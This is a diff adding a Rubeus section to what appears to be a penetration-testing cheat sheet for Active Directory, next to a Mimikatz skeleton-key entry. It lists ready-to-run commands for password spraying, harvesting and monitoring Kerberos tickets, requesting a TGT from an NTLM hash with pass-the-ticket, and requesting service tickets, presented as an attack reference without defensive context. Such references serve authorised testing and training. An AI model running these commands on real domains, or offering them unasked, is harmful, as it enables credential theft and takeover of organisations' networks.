@@ -441,6 +441,29 @@ misc::skeleton
 
 
 * * *
+# Rubeus
+https://www.hackingarticles.in/a-detailed-guide-on-rubeus/
+
+Brute Password spray:
+
+```Rubeus.exe brute /password:Password01 /noticket```
+
+
+Get tickets currently on System:
+
+All - ```Rubeus.exe harvest /interval:30```
+
+Specific User - ```rubeus.exe monitor /targetuser:Mary /interval:10 /nowrap```
+
+
+Request ticket (TGT) based on username and password/hash:
+
+```Rubeus.exe asktgt /domain:$DOMAIN /user:$DOMAIN_USER /rc4:$NTLM_HASH /ptt```
+
+Request Service ticket (TGS) based on Service Name:
+
+```rubeus.exe asktgs /user:admin /ticket:doIDF== /service:LDAP/dc1.ecorp.lab```
+
 
 
 # Check ACLs
